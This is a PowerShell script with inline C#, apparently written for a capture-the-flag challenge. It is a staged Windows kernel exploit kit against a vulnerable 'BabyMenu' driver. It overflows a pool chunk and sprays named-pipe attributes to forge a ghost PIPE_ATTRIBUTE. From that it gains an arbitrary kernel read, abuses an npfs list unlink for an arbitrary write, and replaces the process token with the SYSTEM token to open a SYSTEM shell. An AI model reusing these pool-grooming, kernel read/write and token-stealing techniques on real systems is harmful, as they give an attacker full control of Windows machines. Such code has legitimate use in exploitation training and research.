<#
 12070 · BabyMenu — staged exploit kit (PowerShell + inline C#, NO compiler needed)
 ================================================================================
 Run INSIDE the challenge VM as user  ctfer  (Windows PowerShell 5.1 is enough).

 Stages
 ------
   probe       device reachable? IOCTLs answer?  (corrupts nothing)
   leak        ghost chunk + heap leak -> prints V (driver chunk), G (ghost chunk),
               the PIPE_ATTRIBUTE offset, then self-tests an arbitrary kernel read
               against the ntoskrnl base ("MZ").        <- the crux, run this first
   unlinktest  can npfs be made to unlink our forged LIST_ENTRY, i.e. do a
               "[Blink] = Flink" arbitrary pointer write?  PASS/FAIL in ~2 s,
               decides route R1 (direct token overwrite) vs R2 (quota decrement).
   steal       one unlink -> overwrite EPROCESS.Token with the SYSTEM token ->
               start cmd.exe -> whoami = nt authority\system
   quota       fallback route calibration (needs the WinDbg numbers, cards 2/2b)

 Usage
 -----
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuKit.ps1 -Stage probe
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuKit.ps1 -Stage leak
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuKit.ps1 -Stage unlinktest
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuKit.ps1 -Stage steal `
        -OffPsInitial 0x9f4c80 -OffToken 0x4b8 -OffActiveLinks 0x4a8 -OffPid 0x440

 Every stage prints INFO / PASS / FAIL. Copy the whole console output back: the
 numbers in it are what the final parameters are computed from.

 WARNING: stages leak..steal corrupt kernel pool memory. Only run in the
 challenge VM, and revert the snapshot afterwards.
#>
[CmdletBinding()]
param(
    [ValidateSet('probe','leak','unlinktest','steal','quota')]
    [string]$Stage = 'probe',

    [int]$Spray130      = 0x300,
    [int]$Spray210      = 0x400,
    [int]$GhostReq      = 0x200,   # request that must land in the 0x210 ghost chunk
    [int]$LeakReq       = 0x120,

    [ValidateSet('ansi','utf16')]
    [string]$NameEnc    = 'ansi',

    [string]$OffPsInitial   = '',
    [string]$OffToken       = '',
    [string]$OffActiveLinks = '',
    [string]$OffPid         = '',
    [string]$OffCookie      = '',
    [string]$OffQuotaBlock  = ''
)

$ErrorActionPreference = 'Stop'
$script:nPass = 0
$script:nFail = 0
$script:skipRead = $false
function Info($m) { Write-Host "[*] $m" }
function Pass($m) { Write-Host "[PASS] $m" -ForegroundColor Green; $script:nPass++ }
function Fail($m) { Write-Host "[FAIL] $m" -ForegroundColor Red;   $script:nFail++ }
function Hex($v)  { '0x{0:x}' -f $v }

# ============================================================== native layer
$cs = @'
using System;
using System.Runtime.InteropServices;

public static class BM
{
    public const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    public const uint OPEN_EXISTING = 3, FILE_SHARE_RW = 3;
    public const uint IOCTL_ALLOC = 0x222014, IOCTL_WRITE = 0x222008, IOCTL_FREE = 0x222004;
    public const uint FSCTL_SET_ATTR = 0x11003C, FSCTL_GET_ATTR = 0x110038;

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sa, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(IntPtr h, uint c, byte[] i, uint il, byte[] o, uint ol, out uint r, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr rd, out IntPtr wr, IntPtr sa, uint size);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("ntdll.dll")]
    public static extern int NtFsControlFile(IntPtr f, IntPtr e, IntPtr ar, IntPtr ac, out int iosb,
                                             uint code, byte[] inb, uint inl, byte[] outb, uint outl);
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(int cls, byte[] buf, uint len, out uint ret);

    public static IntPtr g_dev;

    public static long OpenDev()
    {
        g_dev = CreateFileW(@"\\.\BabyMenu", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_RW,
                            IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        return g_dev.ToInt64();
    }
    public static int Ioctl(uint code, byte[] inb, uint inl)
    {
        uint r; bool ok = DeviceIoControl(g_dev, code, inb, inl, null, 0, out r, IntPtr.Zero);
        return ok ? (int)r : Marshal.GetLastWin32Error();
    }
    public static int DrvAlloc() { return Ioctl(IOCTL_ALLOC, null, 0); }
    public static int DrvFree()  { return Ioctl(IOCTL_FREE,  null, 0); }

    public static int DrvWrite(IntPtr payload, uint len)
    {
        byte[] req = new byte[16];
        Buffer.BlockCopy(BitConverter.GetBytes((ulong)len), 0, req, 0, 8);
        Buffer.BlockCopy(BitConverter.GetBytes((ulong)payload.ToInt64()), 0, req, 8, 8);
        return Ioctl(IOCTL_WRITE, req, 16);
    }

    public static int SetAttr(IntPtr pipe, byte[] blob)
    {
        int iosb;
        return NtFsControlFile(pipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out iosb,
                               FSCTL_SET_ATTR, blob, (uint)blob.Length, null, 0);
    }
    public static int GetAttr(IntPtr pipe, byte[] name, out byte[] val, uint vlen)
    {
        int iosb; val = new byte[vlen];
        return NtFsControlFile(pipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out iosb,
                               FSCTL_GET_ATTR, name, (uint)name.Length, val, vlen);
    }
}
'@
Add-Type -TypeDefinition $cs -Language CSharp

# ============================================================== helpers
$script:neighbours = New-Object System.Collections.ArrayList
$script:leak   = $null                  # PipeAttribute living in V
$script:ghost  = $null                  # PipeAttribute living in the ghost chunk
$script:V      = [uint64]0
$script:G      = [uint64]0
$script:GhStructOff = [uint64]0x10      # struct offset inside the ghost chunk
$script:headFlink = [uint64]0            # list head pointers, captured from the leak
$script:headBlink = [uint64]0
$script:nameStr   = [uint64]0            # where our name string lives in the ghost (G+0x80)

function NameBlob([string]$n) {
    if ($NameEnc -eq 'utf16') { return ([Text.Encoding]::Unicode.GetBytes($n) + [byte[]](0,0)) }
    else                      { return ([Text.Encoding]::ASCII.GetBytes($n)   + [byte[]](0))   }
}
function NameLen([string]$n) { return (NameBlob $n).Length }

function New-Attr([string]$name, [int]$request) {
    $rd = [IntPtr]::Zero; $wr = [IntPtr]::Zero
    if (-not [BM]::CreatePipe([ref]$rd, [ref]$wr, [IntPtr]::Zero, 0x1000)) { throw "CreatePipe failed" }
    $nlen = NameLen $name
    $valLen = $request - 0x28 - $nlen
    if ($valLen -lt 0) { [void][BM]::CloseHandle($rd); [void][BM]::CloseHandle($wr); throw "request $request too small for '$name'" }
    $nb = NameBlob $name
    $blob = New-Object byte[] ($nb.Length + $valLen)
    [Array]::Copy($nb, $blob, $nb.Length)
    for ($i = $nb.Length; $i -lt $blob.Length; $i++) { $blob[$i] = 0x41 }
    $st = [BM]::SetAttr($wr, $blob)
    if ($st -ne 0) { [void][BM]::CloseHandle($rd); [void][BM]::CloseHandle($wr); throw ("SetAttr 0x{0:X8}" -f $st) }
    return [pscustomobject]@{ Rd = $rd; Wr = $wr; Name = $name; Req = $request }
}
function Close-Attr($a) {
    if ($null -eq $a) { return }
    if ($a.Wr -ne [IntPtr]::Zero) { [void][BM]::CloseHandle($a.Wr); $a.Wr = [IntPtr]::Zero }
    if ($a.Rd -ne [IntPtr]::Zero) { [void][BM]::CloseHandle($a.Rd); $a.Rd = [IntPtr]::Zero }
}
function Get-AttrValue($a, [int]$len = 0x200) {
    $nb = NameBlob $a.Name
    [byte[]]$val = $null
    $st = [BM]::GetAttr($a.Wr, $nb, [ref]$val, [uint32]$len)
    if ($st -ne 0) { return $null }
    return $val
}
function Set-AttrValue($a) {   # re-set the same name: frees the old attribute, allocates a new one
    $nb = NameBlob $a.Name
    $blob = New-Object byte[] ($nb.Length + 8)
    [Array]::Copy($nb, $blob, $nb.Length)
    return [BM]::SetAttr($a.Wr, $blob)
}

function Get-Modules {
    $len = 0x40000
    while ($true) {
        $buf = New-Object byte[] $len
        $ret = 0
        $st  = [BM]::NtQuerySystemInformation(11, $buf, [uint32]$len, [ref]$ret)
        if ($st -eq 0) { break }
        if (($st -band 0xFFFFFFFF) -eq 0xC0000004 -or ($st -band 0xFFFFFFFF) -eq 0x80000005) { $len *= 2; continue }
        Write-Host ("[!] NtQuerySystemInformation(11) = 0x{0:X8}" -f ($st -band 0xFFFFFFFF))
        return $null
    }
    $count = [BitConverter]::ToUInt32($buf, 0)
    $mods = @()
    for ($i = 0; $i -lt $count; $i++) {
        $off = 8 + $i * 0x128
        if ($off + 0x128 -gt $buf.Length) { break }
        $base = [BitConverter]::ToUInt64($buf, $off + 0x10)
        $size = [BitConverter]::ToUInt32($buf, $off + 0x18)
        $no   = [BitConverter]::ToUInt16($buf, $off + 0x26)
        $name = [Text.Encoding]::ASCII.GetString($buf, $off + 0x28 + $no, [Math]::Min(64, 0x100 - $no))
        $z = $name.IndexOf([char]0); if ($z -ge 0) { $name = $name.Substring(0, $z) }
        $mods += [pscustomobject]@{ Base = $base; Size = $size; Name = $name }
    }
    return $mods
}

function DrvWriteBytes([byte[]]$body, [uint32]$len) {
    $h = [GCHandle]::Alloc($body, [GCHandleType]::Pinned)
    try { return [BM]::DrvWrite($h.AddrOfPinnedObject(), $len) } finally { $h.Free() }
}

# ------------------------- the write window: driver buffer V, body = V+0x10 -----------
# body[0x00..0x30) filler | body[0x30..0x40) ghost POOL_HEADER (BlockSize 0x21, paged)
# body[0x40..]      the GHOSTATTR PIPE_ATTRIBUTE + our name string at G+0x80
function Build-Window([uint64]$flink, [uint64]$blink, [uint64]$namePtr,
                      [uint64]$valSize, [uint64]$valPtr) {
    $body = New-Object byte[] 0x140
    for ($i = 0; $i -lt 0x140; $i++) { $body[$i] = 0x43 }
    $body[0x30] = 0x00; $body[0x31] = 0x00; $body[0x32] = 0x21; $body[0x33] = 0x01
    $o = [int]$script:GhStructOff                     # body offset of the ghost struct
    $words = @($flink, $blink, $namePtr, $valSize, $valPtr)
    for ($k = 0; $k -lt 5; $k++) {
        $at = $o + $k * 8
        if ($at + 8 -le 0x140) { [Array]::Copy([BitConverter]::GetBytes([uint64]$words[$k]), 0, $body, $at, 8) }
    }
    # our name string lives at G+0x80  ->  body offset 0x70
    $nb = NameBlob $script:ghost.Name
    if ((0x70 + $nb.Length) -le 0x140) { [Array]::Copy($nb, 0, $body, 0x70, $nb.Length) }
    return ,$body
}
function Set-Window([uint64]$flink, [uint64]$blink, [uint64]$namePtr,
                    [uint64]$valSize, [uint64]$valPtr) {
    $body = Build-Window $flink $blink $namePtr $valSize $valPtr
    return (DrvWriteBytes $body 0x140)
}

function Read-Kernel([uint64]$addr, [int]$len) {
    # keep the list links consistent with the real head so plain reads never unlink
    $r = Set-Window $script:headFlink $script:headBlink $script:nameStr $len $addr
    if ($r -ne 0) { throw ("Set-Window = 0x{0:X8}" -f $r) }
    $v = Get-AttrValue $script:ghost 0x400
    if ($null -eq $v) { return $null }
    if ($len -gt $v.Length) { return $v }
    return $v[0..($len - 1)]
}
function Read-Ptr([uint64]$addr) {
    $b = Read-Kernel $addr 8
    if ($null -eq $b) { throw ("read {0} failed" -f (Hex $addr)) }
    return [BitConverter]::ToUInt64($b, 0)
}

# ---------------------------------------------------------------- stage A
function Stage-Probe {
    Write-Host "`n=== Stage A: probe ===" -ForegroundColor Cyan
    if ([BM]::OpenDev() -eq -1) { Fail "CreateFile(\\\\.\\BabyMenu) - driver not loaded, or the device ACL denies a standard user"; return $false }
    Pass "opened \\.\BabyMenu"
    $r = [BM]::DrvAlloc(); if ($r -eq 0) { Pass "IOCTL 0x222014 alloc" } else { Fail ("alloc = 0x{0:X8}" -f $r) }
    $p = New-Object byte[] 0x140
    $r = DrvWriteBytes $p 0x120
    if ($r -eq 0) { Pass "IOCTL 0x222008 write 0x120 (in bounds)" } else { Fail ("write = 0x{0:X8}" -f $r) }
    $r = [BM]::DrvFree(); if ($r -eq 0) { Pass "IOCTL 0x222004 free" } else { Fail ("free = 0x{0:X8}" -f $r) }
    Info ("whoami: " + (whoami))
    return ($script:nFail -eq 0)
}

# ---------------------------------------------------------------- stage B
function Stage-Leak {
    Write-Host "`n=== Stage B: ghost chunk + heap leak ===" -ForegroundColor Cyan

    Info "priming the 0x210 lookaside ($Spray210 allocations, free, sleep)"
    $tmp = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $Spray210; $i++) {
        try { [void]$tmp.Add((New-Attr ("g{0:d3}" -f $i) 0x200)) } catch { break }
    }
    Start-Sleep -Milliseconds 2000
    foreach ($a in $tmp) { Close-Attr $a }
    Start-Sleep -Milliseconds 1000
    Pass "lookaside primed ($($tmp.Count) chunks)"

    Info "spraying $Spray130 neighbours of block 0x130"
    for ($i = 0; $i -lt $Spray130; $i++) {
        try { [void]$script:neighbours.Add((New-Attr ("n{0:d4}" -f $i) 0x120)) } catch { break }
    }
    Pass "sprayed $($script:neighbours.Count)"
    for ($i = 0; $i -lt $script:neighbours.Count; $i += 2) { Close-Attr $script:neighbours[$i]; $script:neighbours[$i] = $null }

    if ([BM]::DrvAlloc() -ne 0) { Fail "driver alloc"; return }
    Pass "driver chunk allocated"

    $body = New-Object byte[] 0x140
    for ($i = 0; $i -lt 0x140; $i++) { $body[$i] = 0x43 }
    $body[0x30] = 0x00; $body[0x31] = 0x00; $body[0x32] = 0x21; $body[0x33] = 0x01   # fake hdr: BlockSize 0x21, paged
    $body[0x120] = 0x0F; $body[0x121] = 0x00; $body[0x122] = 0x00; $body[0x123] = 0x05 # neighbour: PreviousSize 0x0F | CacheAligned
    $r = DrvWriteBytes $body 0x124
    if ($r -eq 0) { Pass "overflow write len=0x124" } else { Fail ("overflow write = 0x{0:X8}" -f $r); return }

    for ($i = 1; $i -lt $script:neighbours.Count; $i += 2) { Close-Attr $script:neighbours[$i]; $script:neighbours[$i] = $null }
    Pass "neighbours freed (a bugcheck here == aligned-chunk-confusion is patched)"

    if ([BM]::DrvFree() -ne 0) { Fail "driver free"; return }
    try { $script:leak = New-Attr "LEAKERX" $LeakReq } catch { Fail "LEAKATTR: $_"; return }
    Pass "LEAKATTR in V (7-char name -> its value starts at V+0x40 = G)"
    try { $script:ghost = New-Attr "GHOSTATTR" $GhostReq } catch { Fail "GHOSTATTR: $_"; return }
    Pass "GHOSTATTR in the ghost chunk ($GhostReq request -> 0x210 block)"

    $val = Get-AttrValue $script:leak 0x200
    if ($null -eq $val) { Fail "LEAKATTR read"; return }
    Info "LEAKATTR value, first 0x60 bytes:"
    for ($i = 0; $i -lt 0x60; $i += 16) {
        $slice = $val[$i..([Math]::Min($i + 15, 0x5f))]
        Write-Host ("      +{0:x2}  {1}" -f $i, (($slice | ForEach-Object { '{0:x2}' -f $_ }) -join ' '))
    }

    $cands = @()
    foreach ($off in 0x10, 0x20) {
        if ($off + 0x28 -gt $val.Length) { continue }
        $fl = [BitConverter]::ToUInt64($val, $off)
        $bl = [BitConverter]::ToUInt64($val, $off + 0x08)
        $nm = [BitConverter]::ToUInt64($val, $off + 0x10)
        if ((($fl -shr 48) -eq 0xffff) -and (($nm -shr 48) -eq 0xffff)) {
            $cands += [pscustomobject]@{ Off = $off; Flink = $fl; Blink = $bl; Name = $nm }
        }
    }
    if ($cands.Count -eq 0) { Fail "no PIPE_ATTRIBUTE signature in the leak (adjacency missed -> just rerun)"; return }
    $c = $cands[0]
    $script:GhStructOff = [uint64]$c.Off
    $script:G = [uint64]($c.Name - 0x28 - $c.Off)
    $script:V = [uint64]($script:G - 0x40)
    $script:headFlink = [uint64]$c.Flink
    $script:headBlink = [uint64]$c.Blink
    $script:nameStr   = [uint64]($script:G + 0x80)
    Pass ("ghost PIPE_ATTRIBUTE at G+{0:x}" -f $c.Off)
    Pass ("G(ghost) = {0}    V(driver chunk) = {1}" -f (Hex $script:G), (Hex $script:V))
    Info ("leaked: Flink={0} Blink={1} Name={2}" -f (Hex $c.Flink), (Hex $c.Blink), (Hex $c.Name))
    Info "-> put G into WINDBG-CARDS.md card 3 and run: !pool <G>"

    Close-Attr $script:leak; $script:leak = $null
    if ([BM]::DrvAlloc() -ne 0) { Fail "re-alloc driver chunk"; return }
    Info "driver re-allocated 0x120; the next stage verifies the write window"
}

function Stage-SelfTestRead {
    Write-Host "`n=== Stage B2: arbitrary kernel read self-test ===" -ForegroundColor Cyan
    $mods = Get-Modules
    if ($null -eq $mods) { Fail "SystemModuleInformation unavailable"; return $null }
    $nt = $mods | Where-Object { $_.Name -match 'ntoskrnl\.exe$' } | Select-Object -First 1
    if ($nt) { Pass ("ntoskrnl base = {0} (size {1:x})" -f (Hex $nt.Base), $nt.Size) } else { Fail "ntoskrnl not in the module list"; return $null }
    $npfs = $mods | Where-Object { $_.Name -match 'npfs\.sys$' } | Select-Object -First 1
    if ($npfs) { Info ("npfs base = {0}" -f (Hex $npfs.Base)) }

    foreach ($enc in 'ansi','utf16') {
        $prev = $NameEnc; $script:NameEnc = $enc
        $b = $null
        try { $b = Read-Kernel $nt.Base 2 } catch { Info "read threw: $_" }
        if (($null -ne $b) -and ($b[0] -eq 0x4d) -and ($b[1] -eq 0x5a)) {
            if ($enc -ne $prev) { Info "attribute-name encoding must be: $enc (keep it for later stages)" }
            Pass "arbitrary kernel read works: read 'MZ' at nt base ($enc)"
            return $nt
        }
        $shown = if ($null -ne $b) { ($b | ForEach-Object { '{0:x2}' -f $_ }) -join ' ' } else { 'null' }
        Fail "read at nt base returned $shown ($enc)"
        $script:NameEnc = $prev
    }
    Info "both encodings failed -> check the hexdump from Stage B: the struct offset may be 0x20,"
    Info "and/or try -GhostReq 0x1f0 (if the VS backend adds its own 0x10 header)"
    return $null
}

# ---------------------------------------------------------------- stage C
function Stage-UnlinkTest {
    Write-Host "`n=== Stage C: LIST_ENTRY unlink test ===" -ForegroundColor Cyan
    $scratch = [uint64]($script:G + 0x120)          # inside the ghost chunk's own data
    $value   = [uint64]($script:G + 0x140)          # a valid kernel address (our data, zeroed)
    Info ("target address = {0}   value to write = {1}" -f (Hex $scratch), (Hex $value))
    $before = Read-Kernel $scratch 8
    if ($null -eq $before) { Fail "cannot read the scratch before the test"; return }
    Info ("before: " + (($before | ForEach-Object { '{0:x2}' -f $_ }) -join ' '))

    # RemoveEntryList(Entry):  [Entry->Blink] = Entry->Flink ;  [Entry->Flink + 8] = Entry->Blink
    # => Blink = target, Flink = value performs  [target] = value
    $r = Set-Window $value $scratch $script:nameStr 0 0
    if ($r -ne 0) { Fail ("Set-Window = 0x{0:X8}" -f $r); return }
    Info "re-setting the same attribute name (npfs: find entry -> unlink -> free -> realloc)"
    $st = Set-AttrValue $script:ghost
    Info ("SetAttr returned 0x{0:X8} (an error here is normal: the unlink damaged the list)" -f $st)

    $after = Read-Kernel $scratch 8
    if ($null -eq $after) { Fail "cannot read the scratch after the test"; return }
    $w = [BitConverter]::ToUInt64($after, 0)
    Info ("after : " + (($after | ForEach-Object { '{0:x2}' -f $_ }) -join ' '))
    if ($w -eq $value) { Pass "npfs does a controllable unlink -> route R1 (direct token overwrite) is available" }
    else { Fail ("no unlink write (got {0}) -> use route R2 (-Stage quota)" -f (Hex $w)) }
}

# ---------------------------------------------------------------- stage D
function P([string]$hex) { return [uint64]([Convert]::ToUInt64($hex, 16)) }

function Stage-Steal {
    Write-Host "`n=== Stage D: one unlink -> EPROCESS.Token = SYSTEM token ===" -ForegroundColor Cyan
    if (($OffPsInitial -eq '') -or ($OffToken -eq '') -or ($OffActiveLinks -eq '') -or ($OffPid -eq '')) {
        Fail "missing offsets: -OffPsInitial -OffToken -OffActiveLinks -OffPid (WINDBG-CARDS.md card 2)"
        return
    }
    $mods = Get-Modules
    $nt = $mods | Where-Object { $_.Name -match 'ntoskrnl\.exe$' } | Select-Object -First 1
    if ($null -eq $nt) { Fail "no ntoskrnl base"; return }
    $ntBase = $nt.Base
    Pass ("ntoskrnl base = {0}" -f (Hex $ntBase))

    $psInitial = [uint64]($ntBase + (P $OffPsInitial))
    $sysEproc  = Read-Ptr $psInitial
    Info ("PsInitialSystemProcess {0} -> SYSTEM EPROCESS {1}" -f (Hex $psInitial), (Hex $sysEproc))

    $offTok = P $OffToken; $offLinks = P $OffActiveLinks; $offPid = P $OffPid
    $sysTok = [uint64]((Read-Ptr ([uint64]($sysEproc + $offTok))) -band 0xFFFFFFFFFFFFFFF0)
    Pass ("SYSTEM token = {0}" -f (Hex $sysTok))

    $myPid = [uint32]$PID
    $cur = $sysEproc; $me = [uint64]0
    for ($i = 0; $i -lt 0x400; $i++) {
        $p = (Read-Ptr ([uint64]($cur + $offPid))) -band 0xFFFFFFFF
        if ($p -eq $myPid) { $me = $cur; break }
        $nxt = [uint64]((Read-Ptr ([uint64]($cur + $offLinks))) - $offLinks)
        if (($nxt -eq $sysEproc) -or ($nxt -eq 0)) { break }
        $cur = $nxt
    }
    if ($me -eq 0) { Fail "own EPROCESS not found while walking ActiveProcessLinks"; return }
    Pass ("own EPROCESS = {0} (pid {1})" -f (Hex $me), $myPid)
    $tokField = [uint64]($me + $offTok)
    Info ("[EPROCESS+Token] before = {0}" -f (Hex (Read-Ptr $tokField)))

    $r = Set-Window $sysTok $tokField $script:nameStr 0 0
    if ($r -ne 0) { Fail ("Set-Window = 0x{0:X8}" -f $r); return }
    Info "re-setting the attribute name -> unlink writes the SYSTEM token into EPROCESS.Token"
    $st = Set-AttrValue $script:ghost
    Info ("SetAttr returned 0x{0:X8}" -f $st)

    $now = Read-Ptr $tokField
    if ($now -eq $sysTok) { Pass ("token swapped: [EPROCESS+Token] = {0}" -f (Hex $now)) }
    else { Fail ("token swap did not land (now {0}) - check the offsets and whether Stage C passed" -f (Hex $now)); return }

    Pass ("whoami (this process) = " + (whoami))
    Info "spawning a console that inherits the SYSTEM token ..."
    Start-Process cmd.exe -ArgumentList '/k','whoami & echo %USERNAME% & whoami /user & whoami /priv'
    Pass "when the new window shows 'nt authority\system' the LPE is done - take the video NOW"
    Info "caveat: the SYSTEM token refcount was not incremented; revert the snapshot after recording"
}

# ---------------------------------------------------------------- stage Q
function Stage-Quota {
    Write-Host "`n=== Stage Q: quota decrement calibration (fallback route R2) ===" -ForegroundColor Cyan
    if (($OffCookie -eq '') -or ($OffQuotaBlock -eq '')) {
        Fail "missing -OffCookie / -OffQuotaBlock (WINDBG-CARDS.md cards 2 and 2b)"
        return
    }
    Info "fill in after calibration (see notes/12070-BabyMenu.md section 10):"
    Info "  1. fake EPROCESS in the ghost data (G+0x80..): its QuotaBlock field = target - array offset"
    Info "  2. ghost POOL_HEADER: PoolType = 0x01|0x08, BlockSize = amount/0x10,"
    Info "     ProcessBilled = fakeEproc ^ G ^ ExpPoolQuotaCookie"
    Info "  3. free the ghost chunk -> *(target) -= amount"
    Info "  4. calibrate first: target = ghost data scratch, read it back, measure the unit (1 vs 0x10)"
}

# ---------------------------------------------------------------- main
Write-Host "12070 BabyMenu kit   stage=$Stage   enc=$NameEnc" -ForegroundColor Cyan
if ($Stage -eq 'probe') {
    [void](Stage-Probe)
    Write-Host "`n[summary] PASS=$script:nPass FAIL=$script:nFail" -ForegroundColor Yellow
    exit $script:nFail
}
if (-not (Stage-Probe)) { Write-Host "[!] probe failed - stop" -ForegroundColor Red; exit 1 }

Stage-Leak
if ($script:V -eq 0) { Write-Host "`n[!] leak failed: rerun (LFH randomness) or send the hexdump back" -ForegroundColor Yellow; exit 2 }
$nt = Stage-SelfTestRead
if ($null -eq $nt) { $script:skipRead = $true }

switch ($Stage) {
    'leak'       { }
    'unlinktest' { if (-not $script:skipRead) { Stage-UnlinkTest } }
    'steal'      { if (-not $script:skipRead) { Stage-Steal } }
    'quota'      { Stage-Quota }
}
Write-Host "`n[summary] PASS=$script:nPass FAIL=$script:nFail" -ForegroundColor Yellow
exit $script:nFail
